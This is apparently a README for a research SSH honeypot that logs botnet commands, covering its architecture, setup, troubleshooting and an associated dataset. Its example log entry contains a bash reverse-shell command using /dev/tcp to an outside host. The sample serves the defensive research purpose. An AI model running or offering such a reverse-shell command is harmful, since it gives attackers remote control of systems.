# Multi-threaded SSH Honeypot Framework

[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.19815504.svg)](https://doi.org/10.5281/zenodo.19815504) 
[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.19763026.svg)](https://doi.org/10.5281/zenodo.19763026)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)

This repository contains the source code for the modular multi-threaded SSH honeypot used in the study "Adaptive Decoy Systems for Preemptive Detection of Cyber Threats in Web Environments". The framework is designed to capture post-authentication behavior, command sequences, and payload delivery methods of global botnets, providing high-fidelity telemetry for the "Interactive SSH Attack & Payload Dataset (v2.1)".

## Architecture Overview

The system is built using SOLID principles and an multi-threaded architecture to handle concurrent scanning traffic (e.g., Layer-4 bursts).

- Starter: Manages the lifecycle of multiple honeypot instances.
- Server (Paramiko-based): Implements the SSHv2 protocol, presenting a realistic `Debian 12` banner.
- Emulate Terminal: Provides a high-interaction environment for attackers.
- Executor: Captures and logs interactive shell commands (including file-less `/dev/tcp` payloads).
- Logger: Dual-stream logging to `SQLite` (for analysis) and `Loguru` text files (for forensic redundancy).

## Quick Start

### Prerequisites

- Python 3.10 or higher
- Linux-based OS (recommended for realistic emulation)

### Installation

1. Clone the repository:

```bash
git clone https://github.com/boykoatwork/honeypot.git 
cd honeypot
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

### Configuration

Edit `config/config.yaml` to set your desired port, host, and logging preferences. For research purposes, the management SSH port should be moved to a non-standard port (e.g., 1022) to avoid interference.

### Running the Honeypot

```bash
python3 main.py
```

## Verification & Troubleshooting

### Check if the Port is Listening

After starting `main.py`, verify that the honeypot is successfully listening on the configured port (default 2222 or 22) using `netstat` or `ss`:

```bash
# Using ss (recommended)
sudo ss -tulpn | grep :2222

# Using netstat
sudo netstat -tpln | grep :2222
```
You should see a `python3` process bound to the port. Like

```bash
tcp   LISTEN 0      1                      0.0.0.0:2222       0.0.0.0:*    users:(("python3",pid=56966,fd=7))
```

### Local Connection Test

Attempt to connect to your honeypot from the same machine to ensure the `ServerInterface` is responding:

```bash
ssh bot@localhost -p 2222
```
The honeypot should accept any password and grant access to the simulated shell.

## Example Output

When a bot connects, the `logger` captures structured data like this:

```json
{
  "timestamp": "2025-09-07T14:22:01",
  "event": "SSH login",
  "ip": "47.251.118.172",
  "user": "root",
  "pass": "345gs5662d34",
  "command": "bash -i >& /dev/tcp/1.2.3.4/8080 0>&1"
}
```

## Common Issues

Permission Denied: Binding to port 22 requires root privileges (`sudo python3 main.py`).

Address already in use: Ensure your real SSH server is moved to another port (e.g., 1022) before binding the honeypot to port 22.

Firewall: If testing from outside, ensure the port is open in `ufw` or `iptables`:

```bash
sudo ufw allow 2222/tcp
```

## Security Recommendations

* Always run this honeypot in a dedicated VM or an isolated VPS container.
* Ensure that only the honeypot port (e.g., 22) is exposed to the public internet.
* Do not store any real private keys or credentials on the machine where the honeypot is running.

## Dataset

The refined and audited dataset (Version 2.1) containing over 145,000 events (July–Nov 2025) is available on **Zenodo**:
[Link to Dataset](https://doi.org/10.5281/zenodo.19815504)

## Citation

If you use this framework or the associated dataset in your research, please cite:

```bibtex
@software{boiko_2026_honeypot_git,
  author       = {Boiko, Viktor and Niiakyi, Oleksandr},
  title        = {Multi-threaded High-Interaction SSH Honeypot Framework},
  month        = apr,
  year         = 2026,
  publisher    = {GitHub},
  version      = {v2.1.0},
  url          = {https://github.com/boykoatwork/honeypot}
 }
```

## Contributing

Contributions are welcome! If you have ideas for new modules (e.g., Telnet or FTP support) or improvements to the `Executor` logic:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/NewModule`).
3. Commit your changes.
4. Push to the branch and open a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

**Maintained by:** [Oleksandr Niiakyi](https://github.com/sasha-niiakyi) & [Viktor Boiko](https://github.com/boykoatwork)
